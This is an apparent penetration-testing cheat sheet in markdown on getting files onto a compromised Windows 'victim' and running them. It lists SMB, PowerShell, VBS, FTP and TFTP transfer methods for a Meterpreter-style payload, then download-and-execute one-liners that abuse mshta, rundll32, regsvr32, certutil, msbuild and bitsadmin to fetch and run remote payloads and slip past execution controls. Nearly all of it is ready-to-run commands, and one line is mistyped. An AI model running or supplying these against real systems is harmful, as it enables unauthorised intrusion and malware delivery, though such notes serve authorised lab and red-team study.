## File Transfers
Some methods to transfer files from linux to windows. Thanks to this post
 
 https://blog.ropnop.com/transferring-files-from-kali-to-windows/

### Impacket smbserver

https://github.com/CoreSecurity/impacket

Run smbserver on kali with a share name and the folder you want 

```smbserver.py BLAH /root/shells```

Then from windows victim we can easily copy files
```
net view \\ 10.10.10.10
dir \\10.10.10.10\BLAH
copy \\10.10.10.10\BLAH\met443.exe .
```

You can also just execute things remotely:

```\\10.10.10.10\BLAH\met443.exe```

### Powershell
The long way is to create a .ps1 file to connect to our webserver and download something...
```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.10.14.22:8000/wget.exe" >>wget.ps1
echo $file = "wget.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```
Then to run it from our regular windows shell:
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```
We can run a one line like this also in a normal windows shell to quickly download something...
```
powershell "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.22/met443.exe','C:\Users\740i\Desktop\met443.exe')"
```
Powershell 3.0 and higher Cmdlet
```
Invoke-WebRequest "https://10.10.14.22:8000/met443.exe" -OutFile "C:\Windows\Temp\blah.exe"
```


### VBS
You may have to pipe whatever file through unix2dos before copying to a windows machine. Sometimes its easier to just copy the wget binary from /usr/share/windows-binaries.
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo strData = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
cho Next >> wget.vbs
echo ts.Close >> wget.vbs
```
Then to run it 
```
cscript wget.vbs http://<IP>/<file> <outputfile>
```

### FTP 

For FTP make sure you install it first 
```
apt-get install python-pyftpdlib
python -m pyftpdlib -p 21
```
You then can use a text file containing something like this to download a file...
```
open 10.10.14.22  
anonymous  
whatever  
binary  
get met443.exe  
bye  
```
Then do ```ftp -s:ftp_commands.txt ``` and it downloads with no interaction.

To echo it as a one liner do this...
```
echo open 10.10.14.22>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo get met8888.exe>>ftp_commands.txt&echo bye>>ftp_commands.txt&ftp -s:ftp_commands.txt  
```


### TFTP

 You can use the metasploit ```auxiliary/server/tftp``` server. Or run atftpd:
```
mkdir /tftp
atftpd --daemon --port 69 /tftp
```
Then from windows...
```
tftp -i 10.10.14.22 get met443.exe
```
 
### Debug.exe 
https://github.com/g0tmi1k/exe2hex

Need to test but this only works on 32 bit machines?




## Download and Execute
The rest are quick methods on windows to execute a payload. Taken from https://github.com/swisskyrepo/PayloadsAllTheThings

### Downloaded files location

- C:\Users\<username>\AppData\Local\Microsoft\Windows\Temporary Internet Files\
- C:\Users\<username>\AppData\Local\Microsoft\Windows\INetCache\IE\<subdir>
- C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV

### Powershell

From an HTTP server

```powershell
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
```

From a Webdav server

```powershell
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```

### Cmd

```powershell
cmd.exe /k < \\webdavserver\folder\batchfile.txt
```

### Cscript / Wscript

```powershell
cscript //E:jscript \\webdavserver\folder\payload.txt
```

### Mshta

```powershell
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```powershell
mshta http://webserver/payload.hta
```

```powershell
mshta \\webdavserver\folder\payload.hta
```

### Rundll32

```powershell
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```

### Regasm / Regsvc @subTee

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```

### Regsvr32 @subTee

```powershell
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```powershell
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```

### Odbcconf

```powershell
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```

### Msbuild

```powershell
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```

## Certutil

```
certutil.exe -urlcache -split -f https://myserver/filename outputfilename
```

```powershell
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```

```powershell
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```

### Bitsadmin

```powershell
bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
```


### References

- [arno0x0x - Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
- https://github.com/milkdevil/UltimateAppLockerByPassList
